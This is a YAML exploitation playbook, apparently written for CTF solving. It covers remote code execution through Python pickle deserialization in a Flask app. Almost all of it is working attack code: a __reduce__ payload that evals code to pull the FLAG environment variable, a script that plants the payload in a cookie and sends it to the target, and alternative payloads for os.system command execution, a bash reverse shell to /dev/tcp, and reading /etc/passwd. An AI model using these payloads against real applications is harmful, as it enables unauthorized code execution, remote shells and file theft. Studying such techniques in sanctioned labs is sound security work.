name: python_pickle_deserialization_rce
category: web
tags: [pickle, deserialization, rce, python, flask]
indicators:
  - "pickle.loads() on user input"
  - "Cookie storing serialized objects"
  - "Base64 encoded cookie data"
  - "Flask/Python web application"
  - "Hint: 'env is key' (flag in environment variable)"

tricks:
  - name: "Step 1: Identify pickle deserialization"
    when: "Found base64 cookie that stores object data"
    how: "Decode cookie and check for pickle signature"
    payload: |
      # Pickle signature starts with \x80\x04 or similar
      import base64
      data = base64.b64decode(cookie_value)
      # If starts with \x80, it's pickle format

  - name: "Step 2: Create malicious pickle payload"
    when: "Confirmed pickle.loads() on user-controlled data"
    how: "Use __reduce__ magic method for RCE"
    payload: |
      import pickle
      import base64
      
      class PickleRCE:
          def __reduce__(self):
              # Read FLAG from environment variable
              code = "type('UrlObj', (), {'name': __import__('os').environ.get('FLAG'), 'url': 'http://flag'})()"
              return (eval, (code,))
      
      payload = pickle.dumps([PickleRCE()])
      b64_payload = base64.b64encode(payload).decode('ISO-8859-1')

  - name: "Step 3: Send malicious cookie"
    when: "Payload created"
    how: "Replace bookmarks cookie with malicious payload"
    payload: |
      # First get user cookie
      resp = requests.get('http://target/list')
      user = resp.cookies.get('user')
      
      # Send malicious payload
      cookies = {'bookmarks': b64_payload, 'user': user}
      resp = requests.get('http://target/list', cookies=cookies)
      # Flag appears in rendered page

  - name: "Alternative payloads"
    when: "Need different RCE techniques"
    how: "Other pickle exploitation methods"
    payload: |
      # Execute system command
      class RCE:
          def __reduce__(self):
              return (os.system, ('id > /tmp/out',))
      
      # Reverse shell
      class RCE:
          def __reduce__(self):
              import subprocess
              return (subprocess.call, (['bash', '-c', 'bash -i >& /dev/tcp/IP/PORT 0>&1'],))
      
      # Read file directly
      class RCE:
          def __reduce__(self):
              return (eval, ("open('/etc/passwd').read()",))
